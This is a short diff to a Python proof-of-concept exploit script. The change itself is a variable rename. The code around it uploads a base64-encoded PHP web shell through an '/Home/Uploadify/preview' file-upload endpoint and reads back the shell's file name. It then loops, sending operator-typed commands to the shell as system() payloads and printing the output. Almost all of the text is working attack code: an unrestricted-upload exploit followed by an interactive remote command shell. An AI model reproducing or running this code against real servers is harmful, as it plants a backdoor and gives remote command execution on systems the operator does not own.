@@ -14,8 +14,8 @@ def poc():
 		url1 = target.url + "/Home/Uploadify/preview"
 		password = raw_input("[*] Please enter the shell-password:")
 		phpshell = "<?php eval($_POST['%s']);?>" % password
-		postdata = "data:image/php;base64,%s" % base64.b64encode(phpshell)
-		r = requests.post(url1,data=postdata)
+		postData = "data:image/php;base64,%s" % base64.b64encode(phpshell)
+		r = requests.post(url1,data=postData)
 		# print r.encoding
 		p = re.compile("(?<=preview\/)(.*)(php)")
 		shellName = re.search(p, json.loads(r.text)['result']).group(0)
@@ -28,10 +28,10 @@ def poc():
 				command = raw_input("[*] input the command:")
 				payload= 'system("%s");' % command
 				if command != "exit":
-					postdata = {
+					postData = {
 						password : payload
 					}
-					r = requests.post(shell, data=postdata)
+					r = requests.post(shell, data=postData)
 					print(r.text.encode(r.encoding))
 				else:
 					break
